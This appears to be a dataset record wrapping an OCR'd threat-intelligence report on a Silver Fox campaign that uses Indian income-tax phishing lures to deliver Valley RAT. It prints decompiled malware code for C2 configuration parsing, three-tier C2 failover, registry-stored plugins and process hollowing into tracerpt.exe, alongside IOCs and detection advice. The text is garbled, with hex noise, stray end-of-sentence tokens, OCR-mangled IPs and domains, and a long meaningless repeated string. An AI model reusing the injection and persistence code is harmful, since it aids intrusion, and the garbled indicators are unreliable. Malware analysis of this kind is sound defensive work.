4C ph.f8+3o0'j43OL CE 2E F9 08 0F F0 4C 2C E0 0C A7 EB F9 77 6D B5 I.u..6L,a.5eWmu 8F 96 C2 C9 18 01 63 E8 64 5A B4 CE E8 8E 14 BF -AE..cedz'feZ.z 85 BE FB CE F5 37 55 18 A3 FA 31 B2 7E 81 36 39 .n6f7U.fu1~.69 9A 70 DF 6E 59 F3 C2 63 78 81 48 51 DA 01 88 26 apBnY6Acx.HQU.^ 6A 15 E3 36 BA B2 CC 05 D1 63 F5 7A 1B DC D4 8F .6e+1.Nc0z.u0. 15 17 C8 B6 D7 06 8D 05 40 8A A5 38 38 D4 03 B7 .Ef..d5f80. BC AA AE D5 DF BF 0D 5A 14 EB E2 FB 2A 2D 03 16 +o0z.z.eaU~.  \n\nLooking through the decrypted payload we find that the final payload is a Donut generated shellcode. In this setup, Donut is used to wrap a managed payload into raw shellcode, allowing it to be executed entirely from memory without touching disk.  \n\nBinary \n\nShellcode: Donut(0.9.2)[x86] \n\nS ?<｜end▁of▁sentence｜>\n  \n\nWe can dump the Donut payload by using tools like undonut or donut- decryptor.  \n\n## Stage - 4 : Valley RAT  \n\nAfter the Donut loader successfully injects the final payload into the hollowed explorer.exe process, Valley RAT initializes its sophisticated configuration management subsystem. It starts off by setting anti analysis procedures and then invokes a function sub_405E40() to initialize it's configuration and later create a thread for C2 communication.\n\n<--- Page Split --->\nif (!byte_41DA8C ) \n\n{\n\nbyte_41DA8C = 1;\n\n_wcsrev(a0Db1k1Hs0ld0L);\n\nmemset(&src, 0, 0x12A0u);\n\nsub_405D70('L\"p1:\", Source, 0);\n\nsub_405D70('L\"o1:\", Source_2, 0);\n\nsub_405D70('L\"t1:\", 0, (int)&dword_41CA30);\n\nsub_405D70('L\"p2:\", Source_0, 0);\n\nsub_405D70('L\"o2:\", Source_1, 0);\n\nsub_405D70('L\"t2:\", 0, (int)&dword_41CC70);\n\nsub_405D70('L\"p3:\", Source_3, 0);\n\nsub_405D70('L\"o3:\", Source_4, 0);\n\nsub_405D70('L\"t3:\", 0, (int)&dword_41CE80);\n\nsub_405D70('L\"dd:\", word_41CEF0, 0);\n\nsub_405D70('L\"cl:\", word_41CF2C, 0);\n\nsub_405D70('L\"bb:\", &word_41CF4, 0);\n\nsub_405D70('L\"bb:\", &word_41CFF4, 0);\n\nsub_405D70('L\"jp:\", 0, (int)&unk_41D058);\n\nsub_405D70('L\"sx:\", 0, (int)&unk_41D05C);\n\nsub_405D70('L\"bh:\", 0, (int)&unk_41D060);\n\nsub_405D70('L\"ll:\", 0, (int)&unk_41D064);\n\nsub_405D70('L\"dl:\", 0, (int)&unk_41D06C);\n\nsub_405D70('L\"bd:\", 0, (int)&unk_41D074);\n\n//\"|0:db|1:1k|1:hs|0:1d|0:11|0:hb|1:pj|52.9 .5202:zb|0.1:bb|\"\n\n**Primary C2**\n\n**Tertiary C2**\n\n**Delay**\n\n**Interval**\n\n**Build Version**\n\n**Download**\n\n**Shell**\n\n**Keylogger**\n\n**Backdoor**<｜end▁of▁sentence｜>\n\n<center>C2 Configuration </center>  \n\nThe function implements a two stage loading mechanism. It extracts 22 distinct configuration parameters through a parsing function.  \n\n## Stage 1  \n\n## Command & Control Infrastructure (9 parameters):  \n\n- p1:, p2:, p3: - Three-tier C2 server addresses (correlates with b[.]yuxuanow[.]top identified in network analysis)- o1:, o2:, o3: - Corresponding port numbers for each C2 tier- t1:, t2:, t3: - Connection type flags (1 = HTTP/HTTPS, 0 = raw TCP socket)  \n\n## Operational Parameters (5 parameters):  \n\n- dd: - Initial sleep delay (seconds) before first C2 contact- cl: - Callback interval (seconds) between beaconing attempts- bb: - Build/bot version identifier (observed: 1.0)- bz: - Backup C2 address- fz: - Unknown parameter  \n\n## Feature Flags (8 boolean parameters):  \n\n- kl: - Keylogger (1 = enabled, 0 = disabled)- sh: - Remote shell access (1 = enabled, 0 = disabled)- bd: - Full backdoor mode (1 = enabled, 0 = disabled)- dl: - Download/file transfer capability- jp:, sx:, bh:, ll: - Additional feature toggles  \n\n## Stage 2  \n\nAfter loading the embedded configuration, Valley RAT queries the Windows registry for updated C2 infrastructure:\n\n<--- Page Split --->\ncbData = 0; \n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\", 0, KEY_READ, &phkResult))\nRegQueryValueExW(phkResult, L\"IpDate\", 0, &Type, 0, &cbData); \n\nif ( cbData > 0xA ) \n\nmemset( \n\na0Db1Lk1Hs0Ld0L, // \"|0:db|1:lk|1:hs|0:1d|0:11|0:hb|1:pj\n0, \n\n0x7D0u); \n\nRegQueryValueExW( \n\nphkResult, \n\nL\"IpDate\", \n\n0, \n\n&Type, \n\n(LPBYTE)a0Db1Lk1Hs0Ld0L, \n\n&cbData); \n\nsub_405D70(L\"p1:\", Source, 0); \n\nsub_405D70(L\"o1:\", Source_2, 0); \n\nsub_405D70(L\"t1:\", 0, &dword_41CA30); \n\nsub_405D70(L\"p2:\", Source_0, 0); \n\nsub_405D70(L\"o2:\", Source_1, 0); \n\nsub_405D70(L\"t2:\", 0, &dword_41CC70); \n\nsub_405D70(L\"p3:\", Source_3, 0); \n\nsub_405D70(L\"o3:\", Source_4, 0); \n\nsub_405D70(L\"t3:\", 0, &dword_41CEB0);<｜end▁of▁sentence｜>\n\n<center>Persistence </center>  \n\nIf the registry value exists and exceeds 10 bytes, Valley RAT completely replaces its embedded configuration, then re- parses only the critical C2 parameters (p1 through t3). This allows Silver Fox operators to push updated C2 addresses without deploying new binaries or regaining code execution  \n\nAfter the configuration is loaded. Valley RAT spawns its payload thread(StartAddress) which implements a 3 tier C2 communication loop.  \n\nwhile ( 1 ) \n\n{\n\nnullsub_1();\n\nif ( C2_TOGGLE_FLAG )\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p2_secondary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o2_secondary_c2);\n\nconnection_type_flag = config_t2_secondary_type;\n\nelse\n\n// Use Primary C2 Config\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p1_primary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o1_primary_port);\n\nconnection_type_flag = config_t1_primary_type;\n\nC2_TOGGLE_FLAG = C2_TOGGLE_FLAG == 0;\n\nif ( ++failed_connection_counter == 200 )\n\nnullsub_1();\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p3_tertiary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o3_tertiary_port);\n\nconnection_type_flag = config_t3_tertiary_type;\n\nfailed_connection_counter = 0;\n\nif ( v2 )\n\n(**void (_thiscall ***)(void *))v2)(v2);\n\nv2 = (void *)v15;\n\nif ( connection_type_flag != 1 )<｜end▁of▁sentence｜>\n  \n\nThe communication loop implements multi- tier failover by alternating between primary (p1) and secondary (p2) C2 servers, switching to tertiary (p3) after 200 failures. It supports both HTTP/HTTPS and raw TCP protocols, uses configurable beaconing intervals (cl:) to reduce detection, and delays initial connection (dd:) to evade sandboxes.  \n\nUpon successful connection, Valley RAT sends a \"ready\" beacon (command ID: 4), enables keylogging if configured (kl: flag), and waits for C2 commands. This architecture maps to the discovered infrastructure: b[.jyuxuanow[.]top (103.20.195[.]147) as primary shellcode C2, with secondary/tertiary\n\n<--- Page Split --->\n\ntiers rotating through domains like itdd[.]club, gov- a[.]work, and xzghjec[.]com.  \n\nif (!RegCreateKeyW(HKEY_CURRENT_USER, L\"Console\\\\0\", &hKey)) \n\n{\n\nRegDeleteValueW(hKey, L\"d33f351a4aeea5e608853d1a56661059\");\n\nRegSetValueExW(hKey, L\"d33f351a4aeea5e608853d1a56661059\", 0, REG_BINARY, (const BYTE *)dst, cbData);\n\n}\n\nRegCloseKey(hKey);\n\noperator delete[](dst);\n\n}\n\nArgList_1 = ArgLista;\n\nv8 = _beginthreadex(0, 0, sub_4052C0, ArgLista, 0, 0);\n\ngoto LABEL_21;\n\ntype = 3;\n\nbData = 0;\n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\\\\0\", 0, KEY_READ, &phkResult))\n\nRegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, 0, &cbData);\n\nif ( cbData > 0xA44 )\n\ndst_1 = (char *)operator new[](cbData);\n\nmemset(dst_1, 0, cbData);\n\nif (!RegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, (LPBYTE)dst_1, &cbData))\n\n{\n\nqmemcpy(&dst_, dst_1, 0xA44u);\n\nlpAddress = VirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\nmemcpy_0(lpAddress, dst_1 + 2628, Size);\n\n}\n\nhKey_1 = hKey;\n\n}\n\nRegCloseKey(phkResult);\n\nArgList_1 = ArgLista;<｜end▁of▁sentence｜>\n  \n\nValley RAT implements a modular plugin architecture that enables dynamic capability extension through registry- based persistence. The malware stores downloaded plugins in HKCU\\Console\\0\\d33f351a4aeea5e608853d1a56661059 a registry value name consistent with Valley RAT's established fingerprint, following the MD5 hash naming convention observed across multiple Valley RAT campaigns. The plugin manager operates in two modes: it either receives modules from the C2 server, allocates executable memory with PAGE_EXECUTE_READWRITE permissions, and persists the 2628- byte configuration plus payload code to the registry as REG_BINARY data, or it retrieves previously stored plugins from the registry, validates them against a hardcoded signature, and spawns execution threads.  \n\nEach plugin includes a magic byte guard (0xC9) to prevent double- execution. This architecture allows Silver Fox operators to deploy specialized capabilities such as advanced keylogging, credential harvesting, or lateral movement modules on- demand to compromised systems, with automatic persistence across reboots through registry storage.  \n\nGetSystemDirectoryA(Buffer, @xFFu); \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\SysWOW64\\\\tracerpt.exe\"); \n\nif ( GetFileAttributesA(Buffer) == -1 ) \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\System32\\\\tracerpt.exe\"); \n\nresult = CreateProcessA(Buffer, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, lpProcessInformation); \n\nif ( result ) \n\nlpBaseAddress = VirtualAllocEx( \n\nlpProcessInformation->hProcess, 0, \n\ndwSize, \n\nMEM_COMMIT | MEM_RESERVE, \n\nPAGE_EXECUTE_READWRITE); \n\nif ( lpBaseAddress \n\n&& WriteProcessMemory(lpProcessInformation->hProcess, lpBaseAddress, lpBuffer, dwSize, 0) \n\n&& (hThread = lpProcessInformation->hThread, Context.ContextFlags = 65543, GetThreadContext(hThread, &Context)) \n\n&& (hThread_1 = lpProcessInformation->hThread, \n\nContext.Eip = (DWORD)lpBaseAddress, \n\nSetThreadContext(hThread_1, &Context)) ) \n\n{ \n\nResumeThread(lpProcessInformation->hThread); \n\nreturn 1;<｜end▁of▁sentence｜>\n\n<center>Tracerpt Injection </center>  \n\nAfter downloading plugins from the C2 server, Valley RAT injects them into tracerpt.exe, a legitimate signed Microsoft utility, using the same process following. The malware creates the process in a suspended state, injects the plugin code into its memory, and redirects execution to the malicious payload. Before injection, it patches the plugin with the same 4768- byte configuration containing C2 addresses and feature flags analyzed earlier.  \n\n## Pivoting  \n\nLet's start with the C2 embedded within the decoy document \"ggwk[.]cc\".\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n  \n\nThe C2 has 2 different titles over time, all of them in- line with the Income- tax- themed phishing lure, both from the same ASN. However, there's a common denominator - the favicon.  \n\n<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nWe found 10+ domains that share the same favicon. If we look at the http response titles, we can see that all the titles are Income-tax-themed. The results can be validated against VT to discover additional samples from this campaign. Refer to the IOCs section below.  \n\n<｜end▁of▁sentence｜>\n  \n\n## Diamond Model  \n\n## ADVERSARY \n\nThreat Actor: Silver Fox APT \n\nAttribution Confidence: High \n\nRationale: \n\nRaze of income-tax-themed lures previously observed in Silver Fox operations \n\nNGSI = signed binary DLL hijacking = Donut schedule chain consistent with Chinese APT toolchain \n\nMotivations: Espionage / long-term access \n\nSophistication: High (anti-analysis, in-memory execution, living-off-the-land abuse) \n\n## VICTIM \n\n### Target Profile \n\nIndian enterprises and users \n\nFrance, tax, and business-relevant personas \n\n### Exposures \n\nUser-level compromise escalating to persistent RAT control \n\nLong dwell time risk due to stealthy registry persistence \n\n### Operational Risk \n\nSilent surveillance \n\nCredential theft \n\nSelective deployment of high-risk modules only when needed \n\n## Silver Fox APT - IncomeTax Campaign \n\n### CAPABILITY \n\n### Initial Access \n\nPhishing with government-themed PDF lure \n\n### Execution & Loader Chain \n\nNESS installer \n\nSigned binary DLL hijacking \n\nProcess hooking into explorer.exe \n\nDonut-generated in-memory loader \n\n### Stage 4: Valley RAT Core \n\nTwo-stage configuration system (embedded + registry override) \n\n22-parameter operational config \n\nMulti-tier CI loop with protocol switching \n\n### Post-Compromise Capabilities \n\nKeylogging (M) \n\nInteractive shell (sh) \n\nFile download / upload (df) \n\nFull backdoor mode (xd) \n\n### Modular Expansion \n\nPlugin delivery via CI \n\nIn-memory execution + registry persistence \n\nPlugin integrity checks and execution guards \n\n## INFRASTRUCTURE \n\nInitial Redirect / Decoy Hosting \n\ngop@.ix \n\nIP: 45.207.231.94 \n\nCommand & Control \n\nN: [yuxuanow].top \n\nIP: 103.20.199.2147 \n\nPlotted Infrastructure (Shared Favorites / Patrolled Domains) \n\nlald.club = 45.207.231.107 \n\ngov=work, gov=a.fh, gov=a.club, gov=c.club, gov.club, gov=b.club = 160.124.3.103 \n\nxqghw.com = 8.217.9.165 \n\ndngtaki.cn = 47.239.225.43 \n\nhiko.cn, kiyoi.club, hhmm.wark = 43.100.22.158 \n\nsec2020gb.cn, 2025wmm.cn = 43.100.123.207 \n\nhiko.wark = 43.100.63.145 \n\n### ASN reuse over time: AS112839, AS149801 \n\n### Design Characteristics \n\nThree-tier failover with retry thresholds (200 failures) \n\nMixed protocol support (HTTPs) + two TCPs \n\nRegistry-driven dynamic CI updates \n\nResilience Features<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\n## Impact  \n\nHigh risk of long- term undetected compromise: Registry- resident plugins and delayed beaconing allow the RAT to survive reboots while remaining low- noise. Dynamic threat evolution post- infection: Attackers can upgrade capabilities (keylogging, credential theft, lateral movement) without taking initial access again or malware redeployment. Infrastructure- based blocking is brittle: Tiered C2 failover and protocol switching reduce the effectiveness of static IP/domain blocking. Reduced visibility for incident response: In- memory execution combined with registry- based persistence complicates timeline reconstruction and malware eradication. Elevated data security risk: On- demand module delivery enables targeted credential harvesting and surveillance tailored to victim role and value.  \n\n## Recommendations  \n\nMonitor registry abuse as a persistence layer: Alert on executable REG_BINARY blobs and anomalous values under non- standard paths such as HKCU\\Console\\*, especially those written by user processes. Detect multi- tier C2 logic, not just domains: Build detections for retry- heavy outbound connections, protocol switching (HTTP \\(\\leftrightarrow\\) raw TCP), delayed first beacon, and repeated failures followed by fallback behavior. Instrument memory- permission anomalies: Alert on processes allocating PAGE_EXECUTE_READWRITE memory followed by thread creation, particularly inside explorer.exe. Hunt for signed binary + local DLL load patterns: Correlate execution of signed binaries from temp directories with unsigned DLL loads and immediate child thread creation. Treat RAT feature enablement as an alerting signal: Monitor sudden activation of keylogging APIs, interactive shell behavior, or file transfer operations within long- running, previously quiet processes.  \n\n## Appendix  \n\n## IOCs  \n\n<table><tr><td>Indicator Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Sha256 Hash</td><td>77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2</td><td>Stage 1</td></tr><tr><td>Sha256 Hash</td><td>fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19</td><td>Stage 2</td></tr><tr><td>Sha256 Hash</td><td>f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa</td><td>Stage 3</td></tr><tr><td>Sha256 Hash</td><td>068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbed7741245a7ea97c</td><td>Stage 4</td></tr><tr><td>Domain</td><td>ggwk[.]cc</td><td>Embedded<br>Domain Within<br>Decoy Attachment</td></tr></table>\n\n<--- Page Split --->\n\n\n<table><tr><td>Indicator<br>Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Domain</td><td>b[.]yuxuanow[.]top</td><td>Shellcode C2</td></tr><tr><td>IP</td><td>45.207.231[.]94</td><td>Resolution from<br>ggwk[.]cc</td></tr><tr><td>IP</td><td>103.20.195[.]147</td><td>Resolution from<br>b[.]yuxuanow[.]top</td></tr></table>", "format_code": "cbData=0;if(!RegOpenKeyExW(HKEY_CURRENT_USER,L\"Console\",0,KEY_READ,&phkResult))RegQueryValueExW(phkResult,L\"IpDate\",0,&Type,0,&cbData);if(cbData>0xA)memset(a0Db1Lk1Hs0Ld0L,0,0x7D0u);RegQueryValueExW(phkResult,L\"IpDate\",0,&Type,(LPBYTE)a0Db1Lk1Hs0Ld0L,&cbData);", "hash": "hash"}
{"file_name": "fed9c11a-b86a-49a9-a9e2-24332f01a81c.md", "title": "Silver Fox Targeting India Using Tax Themed Phishing Lures", "malicious_code": "wcscpy_s(&current_c2_addr, 0xFFu, config_p2_secondary_c2);\nwcscpy_s(&current_c2_port, 0x1Eu, config_o2_secondary_c2);", "describe": "cloudsek.com/blog/silver- fox- targeting- india- using- tax- themed- phishing- lures  \n\nPrajwal Awasthi  \n\nTable of Content  \n\nSubscribe to CloudSEK Resources  \n\nGet the latest industry news, threats and resources.  \n\n## Executive Summary  \n\nCloudSEK's TRIAD discovered a campaign by Silver Fox APT targeting India with Income tax themed phishing lures. The lure is visually identical to the ones discovered by other vendors, however, this campaign has not been attributed to a specific threat actor before this report. Attribution accuracy is critical to threat intelligence; it enables defenders to predict adversary behavior and deploy targeted countermeasures. Misattribution from trusted sources propagates through threat feeds and detection systems, causing organizations to focus on the wrong threat while the actual adversary operates undetected. Attributing this campaign to SideWinder APT (India- aligned) contradicts basic victimology and creates systemic confusion. Using our report aims to highlight the sophisticated kill chain by the Chinese APT group, and explains the rationale behind CloudSEK's attribution.  \n\n## Kill Chain  \n\n<｜end▁of▁sentence｜>\n  \n\n## Initial Access Vector  \n\nTOPSOE INDIA PRIVATE LIMITED \n\n \n\nस्वरोचन ने अधिकार - Allgate/1/6/6/6/6/6/6/6/6/6/6/1/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6